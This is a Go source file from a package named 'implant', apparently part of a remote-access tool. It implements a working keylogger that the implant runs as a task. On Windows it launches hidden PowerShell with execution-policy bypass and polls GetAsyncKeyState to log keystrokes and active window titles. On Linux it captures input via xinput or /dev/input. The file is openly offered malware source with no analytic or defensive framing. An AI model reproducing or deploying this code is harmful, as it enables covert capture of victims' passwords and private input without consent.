package implant

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"time"
)

// StartKeylogger captures keystrokes for the specified duration.
// Windows: Uses GetAsyncKeyState via PowerShell
// Linux: Reads from /dev/input/event* or uses xinput
func StartKeylogger(durationSec int) ([]byte, error) {
	if durationSec <= 0 {
		durationSec = 30
	}
	if durationSec > 300 {
		durationSec = 300 // Max 5 minutes
	}

	if runtime.GOOS == "windows" {
		return keylogWindows(durationSec)
	}
	return keylogLinux(durationSec)
}

func keylogWindows(durationSec int) ([]byte, error) {
	// Simplified keylogger — captures active window titles + basic keystroke detection
	ps := fmt.Sprintf("$d=%d; $end=(Get-Date).AddSeconds($d); "+
		"Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey); "+
		"[DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow(); "+
		"[DllImport(\"user32.dll\")] public static extern int GetWindowText(IntPtr h, System.Text.StringBuilder t, int c);' "+
		"-Name KL -Namespace W; $lw=''; $log=''; "+
		"while((Get-Date) -lt $end){ "+
		"$fg=[W.KL]::GetForegroundWindow(); $sb=New-Object System.Text.StringBuilder 256; "+
		"[W.KL]::GetWindowText($fg,$sb,256)|Out-Null; $w=$sb.ToString(); "+
		"if($w -ne $lw -and $w -ne ''){ $log+=[char]10+'['+((Get-Date).ToString('HH:mm:ss'))+'] Window: '+$w+[char]10; $lw=$w }; "+
		"for($i=8;$i -le 190;$i++){ if([W.KL]::GetAsyncKeyState($i) -eq -32767){ "+
		"switch($i){ 13{$log+='[ENTER]'+[char]10} 8{$log+='[BKSP]'} 9{$log+='[TAB]'} 32{$log+=' '} "+
		"default{$log+=[char]::ToLower([char]$i)} } } }; Start-Sleep -Milliseconds 10 }; Write-Output $log",
		durationSec)

	// Invoke powershell.exe directly — DO NOT pipe through ExecuteShell,
	// which wraps everything in `cmd.exe /S /C "..."`. The embedded
	// PowerShell script contains a `|` (the `|Out-Null` for GetWindowText)
	// which cmd.exe parses as a *cmd* pipe before PowerShell ever sees it,
	// producing the bogus `'Out-Null' is not recognized as an internal or
	// external command` error. exec.Command passes args directly without
	// going through a shell.
	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "powershell.exe", "-ep", "bypass", "-w", "hidden", "-c", ps)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil && stdout.Len() == 0 && stderr.Len() == 0 {
		return nil, err
	}
	out := stdout.Bytes()
	if stderr.Len() > 0 {
		if len(out) > 0 {
			out = append(out, '\n')
		}
		out = append(out, stderr.Bytes()...)
	}
	return out, nil
}

func keylogLinux(durationSec int) ([]byte, error) {
	// Use xinput to capture keystrokes
	cmd := fmt.Sprintf(`
timeout %d script -q /dev/null -c 'xinput list --id-only 2>/dev/null | head -1 | xargs -I{} xinput test {} 2>/dev/null' 2>/dev/null || \
timeout %d cat /dev/input/event0 2>/dev/null | xxd -l 1024 || \
echo "Keylogger requires X11 (xinput) or root (/dev/input)"
`, durationSec, durationSec)

	return ExecuteShell([]string{cmd})
}

// ExecuteKeyloggerCommand handles keylogger task arguments.
func ExecuteKeyloggerCommand(args []string) ([]byte, error) {
	duration := 30
	if len(args) > 0 {
		fmt.Sscanf(args[0], "%d", &duration)
	}

	_ = time.Second // avoid unused import
	return StartKeylogger(duration)
}
